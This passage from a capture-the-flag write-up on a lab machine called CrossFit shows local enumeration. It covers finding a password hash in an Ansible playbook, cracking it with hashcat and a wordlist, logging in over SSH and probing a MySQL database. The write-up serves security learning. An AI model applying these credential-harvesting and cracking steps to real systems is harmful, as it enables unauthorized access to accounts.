systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
isaac:x:1000:1000:,,,:/home/isaac:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:107:114:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:108:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
vsftpd:x:1002:1002::/var/vsftpd:/bin/false
Debian-exim:x:109:117::/var/spool/exim4:/usr/sbin/nologin
ftpadm:x:1003:1004::/srv/ftp:/usr/sbin/nologin
hank:x:1004:1006::/home/hank:/bin/bash
</pre></table></code></div></div><p>I inspected <code class="language-plaintext highlighter-rouge">/etc/passwd</code> for local user accounts and found that <code class="language-plaintext highlighter-rouge">root</code>, <code class="language-plaintext highlighter-rouge">isaac</code>, and <code class="language-plaintext highlighter-rouge">hank</code> could login with a shell. These were my most likely targets.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>www-data@crossfit:/home$ ls -la
total 16
drwxr-xr-x  4 root  root  4096 Sep 21 04:00 .
drwxr-xr-x 18 root  root  4096 Sep  2  2020 ..
drwxr-xr-x  6 hank  hank  4096 Mar 20 17:24 hank
drwxr-xr-x  8 isaac isaac 4096 Mar 21 07:19 isaac
</pre></table></code></div></div><p>In the <code class="language-plaintext highlighter-rouge">/home</code> directory there were only two user folders: <code class="language-plaintext highlighter-rouge">hank</code> and <code class="language-plaintext highlighter-rouge">isaac</code>.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>www-data@crossfit:/home$ ls -la hank
total 40
drwxr-xr-x 6 hank hank 4096 Mar 20 17:24 .
drwxr-xr-x 4 root root 4096 Sep 21 04:00 ..
lrwxrwxrwx 1 root root    9 May 12  2020 .bash_history -&gt; /dev/null
-rw-r--r-- 1 hank hank  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 hank hank 3526 Apr 18  2019 .bashrc
drwx------ 4 hank hank 4096 Sep 21 03:56 .cache
drwx------ 4 hank hank 4096 Sep  2  2020 .gnupg
drwxr-xr-x 3 hank hank 4096 Sep 21 03:55 .local
drwx------ 4 hank hank 4096 Sep 21 03:56 .mozilla
lrwxrwxrwx 1 root root    9 May 13  2020 .mysql_history -&gt; /dev/null
-rw-r--r-- 1 hank hank  807 Apr 18  2019 .profile
-rw-r--r-- 1 hank hank    0 Mar 20 17:24 V
-r--r----- 1 root hank   33 Mar 19 13:50 user.txt
www-data@crossfit:/home$ ls -la isaac
total 76
drwxr-xr-x 8 isaac isaac   4096 Mar 21 07:19 .
drwxr-xr-x 4 root  root    4096 Sep 21 04:00 ..
lrwxrwxrwx 1 root  root       9 May 12  2020 .bash_history -&gt; /dev/null
-rw-r--r-- 1 isaac isaac    220 Apr 27  2020 .bash_logout
-rw-r--r-- 1 isaac isaac   3526 Apr 27  2020 .bashrc
drwx------ 5 isaac isaac   4096 May  4  2020 .cache
drwxr-xr-x 4 isaac isaac   4096 May 11  2020 .config
drwx------ 3 isaac isaac   4096 Apr 28  2020 .gnupg
-rw------- 1 isaac isaac     52 Mar 20 18:21 .lesshst
drwxr-xr-x 3 isaac isaac   4096 May  4  2020 .local
lrwxrwxrwx 1 isaac isaac      9 May  4  2020 .mysql_history -&gt; /dev/null
-rw-r--r-- 1 isaac isaac    807 Apr 27  2020 .profile
lrwxrwxrwx 1 root  root       9 May 12  2020 .python_history -&gt; /dev/null
-rw-r--r-- 1 isaac isaac     74 May  5  2020 .selected_editor
drwx------ 3 isaac isaac   4096 Mar 21 06:59 .ssh
-rwxrwxrwx 1 isaac isaac      0 Mar 20 22:26 1
-rwxrwxrwx 1 isaac isaac  16744 Mar 21 07:03 exploit
-rwxrwxrwx 1 isaac isaac    367 Mar 21 07:07 root.sh
drwxrwxrwx 4 isaac admins  4096 May  9  2020 send_updates
</pre></table></code></div></div><p>I saw that <code class="language-plaintext highlighter-rouge">hank</code> had <code class="language-plaintext highlighter-rouge">user.txt</code> in his home folder, so now I knew I needed to move laterally to that user to get it.</p><p>TODO: insert output of search for hank in files (I may have deleted this since because of too many files?)</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>www-data@crossfit:/etc/ansible/playbooks$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Sep 21 06:20 .
drwxr-xr-x 3 root root 4096 May  8  2020 ..
-rw-r--r-- 1 root root  425 Sep  2  2020 adduser_hank.yml
www-data@crossfit:/etc/ansible/playbooks$ cat adduser_hank.yml 
---

- name: Add new user to all systems
  connection: network_cli
  gather_facts: false
  hosts: all
  tasks:
    - name: Add the user 'hank' with default password and make it a member of the 'admins' group
      user:
        name: hank
        shell: /bin/bash
        password: $6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/
        groups: admins
        append: yes
</pre></table></code></div></div><p>After searching for files that had mentioned the user <code class="language-plaintext highlighter-rouge">hank</code>, I found <code class="language-plaintext highlighter-rouge">adduser-hank.yml</code> in the<code class="language-plaintext highlighter-rouge">/etc/ansible/playbooks</code> directory. This file had a password hash in it that I copied to my machine for cracking.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ hashcat --help | grep -i '$6'                                           
   1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating System
                                                                                                        
                                                                                                   
┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ hashcat -O -D1,2 -a0 -m1800 hash /usr/share/wordlists/rockyou.txt       
hashcat (v6.1.1) starting...

Hashfile 'hash' on line 1 ($2y$10...e4oKoEa3Ro9llC/.og/at2.uheWG/igi): Token length exception
Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/:powerpuffgirls
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCf...C1CZG/
Time.Started.....: Fri Jan 15 23:09:52 2021 (9 secs)
Time.Estimated...: Fri Jan 15 23:10:01 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2873 H/s (8.31ms) @ Accel:64 Loops:512 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 23818/14344385 (0.17%)
Rejected.........: 10/23818 (0.04%)
Restore.Point....: 23562/14344385 (0.16%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4608-5000
Candidates.#1....: skorpion -&gt; 211291

Started: Fri Jan 15 23:09:29 2021
Stopped: Fri Jan 15 23:10:02 2021
</pre></table></code></div></div><p>Password hashes with <code class="language-plaintext highlighter-rouge">$6</code> at the beginning are most likely Unix sha512crypt encrypted. I used this information to quickly crack the hash using hashcat. It revealed the password to be <code class="language-plaintext highlighter-rouge">powerpuffgirls</code>.</p><h3 id="usertxt">User.txt</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ ssh hank@10.10.10.208                                                                           1 ⨯
The authenticity of host '10.10.10.208 (10.10.10.208)' can't be established.
ECDSA key fingerprint is SHA256:tUOAuaaEof1kTFd4m9xiLiHk2k/pKSRnwhASRLb89Bo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.10.208' (ECDSA) to the list of known hosts.
hank@10.10.10.208's password: 
Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Mon Sep 21 05:46:24 2020 from 10.10.14.2
hank@crossfit:~$ ls -la
total 40
drwxr-xr-x 6 hank hank 4096 Sep 21 03:56 .
drwxr-xr-x 4 root root 4096 Sep 21 04:00 ..
lrwxrwxrwx 1 root root    9 May 12  2020 .bash_history -&gt; /dev/null
-rw-r--r-- 1 hank hank  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 hank hank 3526 Apr 18  2019 .bashrc
drwx------ 4 hank hank 4096 Sep 21 03:56 .cache
drwx------ 4 hank hank 4096 Sep  2 15:22 .gnupg
drwxr-xr-x 3 hank hank 4096 Sep 21 03:55 .local
drwx------ 4 hank hank 4096 Sep 21 03:56 .mozilla
lrwxrwxrwx 1 root root    9 May 13  2020 .mysql_history -&gt; /dev/null
-rw-r--r-- 1 hank hank  807 Apr 18  2019 .profile
-r--r----- 1 root hank   33 Jan 15 00:50 user.txt
hank@crossfit:~$ cat user.txt 
9e326def2df97f2b7ac41362a8d8f446
</pre></table></code></div></div><p>After cracking the hash to get the password I fired up SSH and logged in as <code class="language-plaintext highlighter-rouge">hank</code>. The first thing I did was collect my hard-earned proof.</p><h2 id="path-to-power-gaining-administrator-access">Path to Power (Gaining Administrator Access)</h2><h3 id="enumeration-as-hank">Enumeration as <code class="language-plaintext highlighter-rouge">hank</code></h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>hank@crossfit:~$ id
uid=1004(hank) gid=1006(hank) groups=1006(hank),1005(admins)
</pre></table></code></div></div><p>The user <code class="language-plaintext highlighter-rouge">hank</code> was in the group <code class="language-plaintext highlighter-rouge">admins</code> which sounded interesting.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>hank@crossfit:~$ sudo -l
-bash: sudo: command not found
</pre></table></code></div></div><p>Well, this was odd… It told me that it could not find the <code class="language-plaintext highlighter-rouge">sudo</code> command. I went and checked inside <code class="language-plaintext highlighter-rouge">/usr/sbin</code> and there was no binary for <code class="language-plaintext highlighter-rouge">sudo</code> installed.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>hank@crossfit:~$ ifconfig
-bash: ifconfig: command not found
hank@crossfit:~$ ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:60:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.208/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:60c9/64 scope global dynamic mngtmpaddr 
       valid_lft 85816sec preferred_lft 13816sec
    inet6 fe80::250:56ff:feb9:60c9/64 scope link 
       valid_lft forever preferred_lft forever
</pre></table></code></div></div><p>The program <code class="language-plaintext highlighter-rouge">ifconfig</code> was also missing.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>hank@crossfit:~$ uname -a
Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
</pre></table></code></div></div><p>I decided to check and see if this was a strange distribution, or a BSD system, but <code class="language-plaintext highlighter-rouge">uname -a</code> told me that this was a Debian-based system. Curiouser and curiouser…</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>hank@crossfit:/dev/shm$ ps aux &gt; ps
hank@crossfit:/dev/shm$ ls
ps
hank@crossfit:/dev/shm$ cat ps
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
hank       722  0.0  0.5  39896 23024 ?        Ss   00:50   0:04 /usr/bin/python3 /opt/selenium/check_report.py
hank       812  0.0  0.1 346280  4740 ?        Sl   00:50   0:00 /opt/selenium/geckodriver --port 36929
hank       981  0.0  5.6 2701532 229536 ?      Sl   00:50   0:11 firefox-esr -marionette -headless -foreground -no-remote -profile /tmp/rust_mozprofileJXUpIz
hank      1068  0.0  2.1 2381776 85464 ?       Sl   00:50   0:06 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 1 -isForBrowser -prefsLen 1 -prefMapSize 178236 -parentBuildID 20200429190206 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appdir /usr/lib/firefox-esr/browser 981 true tab
hank      1091  0.0  2.3 2385708 96032 ?       Sl   00:50   0:01 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 2 -isForBrowser -prefsLen 1 -prefMapSize 178236 -parentBuildID 20200429190206 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appdir /usr/lib/firefox-esr/browser 981 true tab
hank      1135  0.0  1.5 2366460 61348 ?       Sl   00:50   0:00 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 3 -isForBrowser -prefsLen 8358 -prefMapSize 178236 -parentBuildID 20200429190206 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appdir /usr/lib/firefox-esr/browser 981 true tab
hank      8471  0.0  0.2  21160  9036 ?        Ss   10:57   0:00 /lib/systemd/systemd --user
hank      8488  0.0  0.1   8504  5316 pts/0    Ss   10:57   0:00 -bash
hank      8638  0.0  0.0  10632  3112 pts/0    R+   11:07   0:00 ps aux
</pre></table></code></div></div><p>I checked for running processes and noticed a few things were running from the <code class="language-plaintext highlighter-rouge">/opt/selenium</code> folder. I wasn’t sure what that was so I looked it up. I also noticed that I was unable to see any processes from other users.</p><ul><li><a href="https://www.selenium.dev/">https://www.selenium.dev/</a></ul><blockquote><p>Selenium automates browsers. That’s it!</p></blockquote><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>hank@crossfit:/var$ cd www/
hank@crossfit:/var/www$ ls
development-test  ftp  gym-club  html
hank@crossfit:/var/www$ ls -la
total 24
drwxr-xr-x  6 root     root   4096 May 28  2020 .
drwxr-xr-x 13 root     root   4096 May 11  2020 ..
drwxrwxr-x  2 www-data vsftpd 4096 Sep 21 05:45 development-test
drwxr-xr-x 13 root     root   4096 May  7  2020 ftp
drwxr-xr-x  9 root     root   4096 May 12  2020 gym-club
drwxr-xr-x  2 root     root   4096 May  1  2020 html
</pre></table></code></div></div><p>While checking for folders in the <code class="language-plaintext highlighter-rouge">/var/www</code> directory I noticed they looked suspiciously familiar…I also noticed the permissions for the user and group. The <code class="language-plaintext highlighter-rouge">vsftpd</code> group was what had allowed me to <code class="language-plaintext highlighter-rouge">PUT</code> files in the <code class="language-plaintext highlighter-rouge">development-test</code> folder using FTP. Interestingly, I could have also done this through a web interface if there had been a site hosted here because it was owned by <code class="language-plaintext highlighter-rouge">www-data</code>. This is probably why the folder was empty.</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
</pre><td class="rouge-code"><pre><span class="n">hank</span><span class="o">@</span><span class="n">crossfit</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">gym</span><span class="o">-</span><span class="n">club</span><span class="err">$</span> <span class="n">mysql</span> <span class="o">-</span><span class="n">u</span> <span class="n">crossfit</span> <span class="o">-</span><span class="n">p</span> <span class="o">-</span><span class="n">D</span> <span class="n">crossfit</span>
<span class="n">Enter</span> <span class="n">password</span><span class="p">:</span> 
<span class="n">Reading</span> <span class="k">table</span> <span class="n">information</span> <span class="k">for</span> <span class="k">completion</span> <span class="k">of</span> <span class="k">table</span> <span class="k">and</span> <span class="k">column</span> <span class="k">names</span>
<span class="n">You</span> <span class="n">can</span> <span class="n">turn</span> <span class="k">off</span> <span class="n">this</span> <span class="n">feature</span> <span class="k">to</span> <span class="k">get</span> <span class="n">a</span> <span class="n">quicker</span> <span class="n">startup</span> <span class="k">with</span> <span class="o">-</span><span class="n">A</span>

<span class="n">Welcome</span> <span class="k">to</span> <span class="n">the</span> <span class="n">MariaDB</span> <span class="n">monitor</span><span class="p">.</span>  <span class="n">Commands</span> <span class="k">end</span> <span class="k">with</span> <span class="p">;</span> <span class="k">or</span> <span class="err">\</span><span class="k">g</span><span class="p">.</span>
<span class="n">Your</span> <span class="n">MariaDB</span> <span class="k">connection</span> <span class="n">id</span> <span class="k">is</span> <span class="mi">9552</span>
<span class="n">Server</span> <span class="k">version</span><span class="p">:</span> <span class="mi">10</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">22</span><span class="o">-</span><span class="n">MariaDB</span><span class="o">-</span><span class="mi">0</span><span class="o">+</span><span class="n">deb10u1</span> <span class="n">Debian</span> <span class="mi">10</span>

<span class="n">Copyright</span> <span class="p">(</span><span class="k">c</span><span class="p">)</span> <span class="mi">2000</span><span class="p">,</span> <span class="mi">2018</span><span class="p">,</span> <span class="n">Oracle</span><span class="p">,</span> <span class="n">MariaDB</span> <span class="n">Corporation</span> <span class="n">Ab</span> <span class="k">and</span> <span class="n">others</span><span class="p">.</span>

<span class="k">Type</span> <span class="s1">'help;'</span> <span class="k">or</span> <span class="s1">'</span><span class="se">\h</span><span class="s1">'</span> <span class="k">for</span> <span class="n">help</span><span class="p">.</span> <span class="k">Type</span> <span class="s1">'</span><span class="se">\c</span><span class="s1">'</span> <span class="k">to</span> <span class="n">clear</span> <span class="n">the</span> <span class="k">current</span> <span class="k">input</span> <span class="k">statement</span><span class="p">.</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">show</span> <span class="n">tables</span>
    <span class="o">-&gt;</span> <span class="p">;</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="o">|</span> <span class="n">Tables_in_crossfit</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="o">|</span> <span class="n">messages</span>           <span class="o">|</span>
<span class="o">|</span> <span class="n">roles</span>              <span class="o">|</span>
<span class="o">|</span> <span class="n">security_report</span>    <span class="o">|</span>
<span class="o">|</span> <span class="n">trainers</span>           <span class="o">|</span>
<span class="o">|</span> <span class="n">users</span>              <span class="o">|</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="mi">5</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">000</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span>
    <span class="o">-&gt;</span> <span class="p">;</span>
<span class="n">Empty</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">000</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">trainers</span><span class="p">;</span>
<span class="o">+</span><span class="c1">----+------------+-----------+---------------+------+</span>
<span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">first_name</span> <span class="o">|</span> <span class="n">last_name</span> <span class="o">|</span> <span class="n">pic</span>           <span class="o">|</span> <span class="k">role</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">----+------------+-----------+---------------+------+</span>
<span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="n">Becky</span>      <span class="o">|</span> <span class="n">Taylor</span>    <span class="o">|</span> <span class="n">trainer</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="n">jpg</span> <span class="o">|</span>    <span class="mi">1</span> <span class="o">|</span>
<span class="o">|</span>  <span class="mi">2</span> <span class="o">|</span> <span class="n">Noah</span>       <span class="o">|</span> <span class="n">Leonard</span>   <span class="o">|</span> <span class="n">trainer</span><span class="o">-</span><span class="mi">2</span><span class="p">.</span><span class="n">jpg</span> <span class="o">|</span>    <span class="mi">2</span> <span class="o">|</span>
<span class="o">|</span>  <span class="mi">3</span> <span class="o">|</span> <span class="n">Evelyn</span>     <span class="o">|</span> <span class="n">Fields</span>    <span class="o">|</span> <span class="n">trainer</span><span class="o">-</span><span class="mi">3</span><span class="p">.</span><span class="n">jpg</span> <span class="o">|</span>    <span class="mi">1</span> <span class="o">|</span>
<span class="o">|</span>  <span class="mi">4</span> <span class="o">|</span> <span class="n">Leroy</span>      <span class="o">|</span> <span class="n">Guzman</span>    <span class="o">|</span> <span class="n">trainer</span><span class="o">-</span><span class="mi">4</span><span class="p">.</span><span class="n">jpg</span> <span class="o">|</span>    <span class="mi">3</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">----+------------+-----------+---------------+------+</span>
<span class="mi">4</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">000</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">show</span> <span class="o">*</span> <span class="k">from</span> <span class="n">security_report</span><span class="p">;</span>
<span class="n">ERROR</span> <span class="mi">1064</span> <span class="p">(</span><span class="mi">42000</span><span class="p">):</span> <span class="n">You</span> <span class="n">have</span> <span class="n">an</span> <span class="n">error</span> <span class="k">in</span> <span class="n">your</span> <span class="k">SQL</span> <span class="n">syntax</span><span class="p">;</span> <span class="k">check</span> <span class="n">the</span> <span class="n">manual</span> <span class="n">that</span> <span class="n">corresponds</span> <span class="k">to</span> <span class="n">your</span> <span class="n">MariaDB</span> <span class="n">server</span> <span class="k">version</span> <span class="k">for</span> <span class="n">the</span> <span class="k">right</span> <span class="n">syntax</span> <span class="k">to</span> <span class="n">use</span> <span class="n">near</span> <span class="s1">'* from security_report'</span> <span class="k">at</span> <span class="n">line</span> <span class="mi">1</span>
<span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">show</span> <span class="o">*</span> <span class="k">from</span> <span class="n">roles</span><span class="p">;</span>
<span class="n">ERROR</span> <span class="mi">1064</span> <span class="p">(</span><span class="mi">42000</span><span class="p">):</span> <span class="n">You</span> <span class="n">have</span> <span class="n">an</span> <span class="n">error</span> <span class="k">in</span> <span class="n">your</span> <span class="k">SQL</span> <span class="n">syntax</span><span class="p">;</span> <span class="k">check</span> <span class="n">the</span> <span class="n">manual</span> <span class="n">that</span> <span class="n">corresponds</span> <span class="k">to</span> <span class="n">your</span> <span class="n">MariaDB</span> <span class="n">server</span> <span class="k">version</span> <span class="k">for</span> <span class="n">the</span> <span class="k">right</span> <span class="n">syntax</span> <span class="k">to</span> <span class="n">use</span> <span class="n">near</span> <span class="s1">'* from roles'</span> <span class="k">at</span> <span class="n">line</span> <span class="mi">1</span>
<span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">security_report</span><span class="p">;</span>
<span class="n">Empty</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">000</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">roles</span><span class="p">;</span>
<span class="o">+</span><span class="c1">----+---------+</span>
<span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">name</span>    <span class="o">|</span>
<span class="o">+</span><span class="c1">----+---------+</span>
<span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="n">Gymer</span>   <span class="o">|</span>
<span class="o">|</span>  <span class="mi">2</span> <span class="o">|</span> <span class="n">Trainer</span> <span class="o">|</span>
<span class="o">|</span>  <span class="mi">3</span> <span class="o">|</span> <span class="n">Manager</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">----+---------+</span>
<span class="mi">3</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">000</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">message</span>
<span class="n">message</span>           <span class="n">messages</span><span class="p">.</span><span class="n">email</span>    <span class="n">messages</span><span class="p">.</span><span class="n">message</span>  
<span class="n">messages</span>          <span class="n">messages</span><span class="p">.</span><span class="n">id</span>       <span class="n">messages</span><span class="p">.</span><span class="n">name</span>     
<span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">messages</span><span class="p">;</span>
<span class="n">Empty</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">email</span><span class="p">,</span><span class="n">id</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">message</span> <span class="k">from</span> <span class="n">messages</span><span class="p">;</span>
<span class="n">Empty</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">000</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">show</span> <span class="k">database</span><span class="p">;</span>
